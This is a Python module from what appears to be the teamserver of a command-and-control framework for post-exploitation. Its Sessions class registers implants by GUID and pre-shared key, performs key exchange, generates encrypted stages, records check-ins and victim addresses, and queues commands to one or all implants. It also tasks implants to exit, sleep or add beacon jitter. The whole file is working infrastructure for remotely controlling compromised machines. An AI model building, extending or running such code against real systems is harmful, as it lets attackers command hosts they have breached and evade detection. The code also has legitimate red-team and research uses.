import os
import logging
import asyncio
import uuid
import core.events as events
from core.utils import gen_random_string, CmdError
from core.teamserver import ipc_server
from core.teamserver.db import STDatabase
from core.teamserver.crypto import gen_stager_psk
from core.teamserver.session import Session
from core.teamserver.job import Job
#from core.teamserver.utils import subscribe, register_subscriptions

"""
The following code sucks.

We can probably pull some really fancy stuff here like registering functions 
using decorators in each Session object so when an event is published
it gets routed directly to the right session with the appropriate GUID.
This would be ideal as it would remove almost all of these helper functions.

I've tried doing this, but it resulted in me drinking a lot with very little success.
"""

#@register_subscriptions
class Sessions:
    name = 'sessions'
    description = 'Sessions menu'

    def __init__(self, teamserver):
        self.teamserver = teamserver
        self.selected = None
        self.sessions = set()

        ipc_server.attach(events.KEX, self.kex)
        ipc_server.attach(events.ENCRYPT_STAGE, self.gen_encrypted_stage)
        ipc_server.attach(events.SESSION_STAGED, self.notify_session_staged)
        #ipc_server.attach(events.SESSION_REGISTER, self._register)
        ipc_server.attach(events.SESSION_CHECKIN, self.session_checked_in)
        ipc_server.attach(events.NEW_JOB, self.add_job)
        ipc_server.attach(events.JOB_RESULT, self.job_result)

        with STDatabase() as db:
            for registered_session in db.get_sessions():
                _, guid, psk = registered_session
                self._register(guid, psk)

    def get_session(self, guid):
        return list(filter(lambda x: x == guid, self.sessions))[0]

    def _register(self, guid, psk):
        session = Session(guid, psk)
        logging.info(f"Registering session: {session}")
        self.sessions.add(session)

    def register(self, guid, psk):
        if not guid:
            guid = uuid.uuid4()
        if not psk:
            psk = gen_stager_psk()

        try:
            uuid.UUID(str(guid))
        except ValueError:
            raise CmdError("Invalid Guid")

        with STDatabase() as db:
            db.add_session(guid, psk)
        self._register(guid, psk)

        return {"guid": str(guid), "psk": psk}

    #@subscribe(events.KEX)
    def kex(self, kex_tuple):
        guid, remote_addr, enc_pubkey = kex_tuple

        try:
            session = self.get_session(guid)
            logging.debug(f"Creating new shared secret with {guid}")
            session.crypto.derive_shared_key(enc_pubkey)
            return session.crypto.enc_public_key
        except IndexError:
            logging.error(f"Got kex request from {remote_addr} but no sessions registered for guid {guid}")

    #@subscribe(events.ENCRYPT_STAGE)
    def gen_encrypted_stage(self, info_tuple):
        guid, _, comms = info_tuple
        session = self.get_session(guid)
        return session.gen_encrypted_stage(comms.split(','))

    #@subscribe(events.SESSION_CHECKIN)
    def session_checked_in(self, checkin_tuple):
        guid, remote_addr = checkin_tuple

        session = self.get_session(guid)
        session.address = remote_addr
        session.checked_in()
        return session.jobs.get()

    #@subscribe(events.NEW_JOB)
    def add_job(self, job_tuple):
        guid, job = job_tuple
        if guid.lower() == 'all':
            for session in self.sessions:
                session.jobs.add(job)
        else:
            try:
                session = self.get_session(guid)
                session.jobs.add(job)
            except IndexError:
                logging.error(f"No session was found with name: {guid}")

    #@subscribe(events.JOB_RESULT)
    def job_result(self, result_tuple):
        guid, job_id, data = result_tuple
        session = self.get_session(guid)

        decrypted_job, job_output = session.jobs.decrypt(job_id, data)

        if not session.info and decrypted_job['cmd'] == 'CheckIn':
            session.info = job_output
            logging.debug(f"New session {session.guid} connected! ({session.address})")

            #Since these methods get called from a seperate OS thread in ipc_server, we must use asyncio.run_coroutine_threadsafe()
            asyncio.run_coroutine_threadsafe(
                    self.teamserver.users.broadcast_event(
                        events.NEW_SESSION, 
                        f"New session {session.guid} connected! ({session.address})"
                ),
                loop=self.teamserver.loop
            )

            asyncio.run_coroutine_threadsafe(
                self.teamserver.update_server_stats(),
                loop=self.teamserver.loop
            )
        else:
            logging.debug(f"{session.guid} returned job/command result (id: {job_id})")

            asyncio.run_coroutine_threadsafe(
                    self.teamserver.users.broadcast_event(
                        events.JOB_RESULT, 
                        {'id': job_id, 'output': job_output, 'session': session.guid, 'address': session.address}
                ),
                loop=self.teamserver.loop
            )

    #@subscribe(events.SESSION_STAGED)
    def notify_session_staged(self, msg):
        #Since these methods get called from a seperate OS thread in ipc_server, we must use asyncio.run_coroutine_threadsafe()
        asyncio.run_coroutine_threadsafe(
                self.teamserver.users.broadcast_event(
                    events.SESSION_STAGED, 
                    msg
            ),
            loop=self.teamserver.loop
        )

    def list(self):
        return {s.guid: dict(s) for s in self.sessions if s.info}
    
    def info(self, guid):
        return dict(self.get_session(guid))
    
    def kill(self, guid):
        try:
            session = self.get_session(guid)
            session.jobs.add(Job(command=('Exit', [])))
            return {'guid': guid, 'status': 'Tasked to exit'}
        except IndexError:
            raise CmdError(f"No session named: {guid}")
    
    def sleep(self, guid, interval):
        try:
            session = self.get_session(guid)
            session.jobs.add(Job(command=('Sleep', [int(interval)])))
        except IndexError:
            raise CmdError(f"No session named: {guid}")

    def jitter(self, guid, max, min):
        try:
            session = self.get_session(guid)
            if min:
                session.jobs.add(Job(command=('Jitter', [int(max), int(min)])))
            else:
                session.jobs.add(Job(command=('Jitter', [int(max)])))
        except IndexError:
            raise CmdError(f"No session named: {guid}")

    def __iter__(self):
        for session in self.sessions:
            if session.info:
                yield (str(session._guid), dict(session))

    def __str__(self):
        return self.__class__.__name__.lower()
